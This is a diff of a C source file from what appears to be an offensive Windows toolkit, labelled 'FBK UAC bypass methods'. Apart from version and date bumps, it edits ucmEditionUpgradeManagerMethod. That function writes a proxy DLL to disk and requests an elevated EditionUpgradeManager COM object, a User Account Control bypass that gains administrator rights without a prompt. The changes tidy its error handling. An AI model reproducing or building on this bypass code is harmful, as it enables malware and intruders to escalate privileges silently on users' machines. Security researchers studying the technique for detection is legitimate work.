@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2018 - 2020
+*  (C) COPYRIGHT AUTHORS, 2018 - 2022
 *
 *  TITLE:       RINN.C
 *
-*  VERSION:     3.50
+*  VERSION:     3.61
 *
-*  DATE:        14 Sep 2019
+*  DATE:        22 Jun 2022
 *
 *  FBK UAC bypass methods.
 *
@@ -41,7 +41,7 @@ NTSTATUS ucmEditionUpgradeManagerMethod(
 {
     NTSTATUS                    MethodResult = STATUS_ACCESS_DENIED;
     BOOL                        bEnvSet = FALSE;
-    HRESULT                     hr = E_UNEXPECTED, hr_init;
+    HRESULT                     hr_init;
     IEditionUpgradeManager     *Manager = NULL;
 
     DWORD Data[3];
@@ -117,16 +117,15 @@ NTSTATUS ucmEditionUpgradeManagerMethod(
         _strcat(lpPath, CLIPUP_EXE);
         if (supWriteBufferToFile(lpPath, ProxyDll, ProxyDllSize)) {
 
-            hr = ucmAllocateElevatedObject(T_CLSID_EditionUpgradeManager,
+            if (FAILED(ucmAllocateElevatedObject(T_CLSID_EditionUpgradeManager,
                 &IID_EditionUpgradeManager,
                 CLSCTX_LOCAL_SERVER,
-                &Manager);
-
-            if (hr != S_OK)
+                &Manager)))
+            {
                 break;
+            }
 
             if (Manager == NULL) {
-                hr = E_OUTOFMEMORY;
                 break;
             }
 
